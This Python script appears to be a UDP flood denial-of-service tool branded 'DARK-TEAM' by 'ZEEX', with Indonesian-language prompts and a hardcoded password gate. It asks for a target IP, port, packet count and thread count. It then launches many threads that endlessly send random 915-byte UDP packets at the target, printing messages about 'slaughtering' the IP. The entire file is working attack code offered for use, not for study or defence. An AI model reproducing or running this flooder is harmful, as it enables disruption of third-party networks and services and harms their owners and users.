import random
import socket
import threading
import time
import os,sys

os.system("clear")
password = "ZeeX"

for i in range(3):
	pwd = input("\033[1;31;40m[•]PASSWORD : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[1;32;40m[✓]PASSWORD BENAR ")
		break
	else:
		time.sleep(5)
		print("[×] Password Salah!!! ")
		continue
time.sleep(5)
os.system("clear")
print("\033[1;32;40m>> TOOLS BY ZEEX <<")
time.sleep(1)
print("\033[1;32;40m>> DONT ABUSE TOOLS <<")
time.sleep(1)
print("\033[1;32;40m>> Join My Community <<")
time.sleep(3)
os.system("clear")
print("""\033[31m
  ____    _    ____  _  __     
 |  _ \  / \  |  _ \| |/ /     
 | | | |/ _ \ | |_) | ' /_____ 
 | |_| / ___ \|  _ <| . \_____|
 |____/_/___\_\_|_\_\_|\_\__   
 |_   _| ____|  / \  |  \/  |  
   | | |  _|   / _ \ | |\/| |  
   | | | |___ / ___ \| |  | |  
   |_| |_____/_/   \_\_|  |_|""")

ip = str(input("\033[92mHOST/IP: \033[31m"))
port = int(input("\033[92mPORT: \033[31m"))
choice = str(input("\033[92mGAS?(y/n): \033[31m"))
times = int(input("\033[92mPACKET: \033[31m"))
threads = int(input("\033[92mTHREAD: \033[31m"))
os.system("clear")
def run():
    data =random._urandom(915)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print("\033[91m MEMBANTAI IP \033[36m%s \033[91mMENINDAS PORT \033[36m%s"%(ip, port))
        except:
            print("[•] RECONECT")

def run2():
    data = random._urandom(915)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("\033[91m MEMBANTAI IP \033[36m%s \033[91mMENINDAS PORT \033[36m%s"%(ip, port))
        except:
            s.close()
            print("[•] RECONECT")

def run3():
    data = random._urandom(915)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("\033[91m MEMBANTAI IP \033[36m%s \033[91mMENINDAS PORT \033[36m%s"%(ip, port))
        except:
            s.close()
            print("[•] RECONECT")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()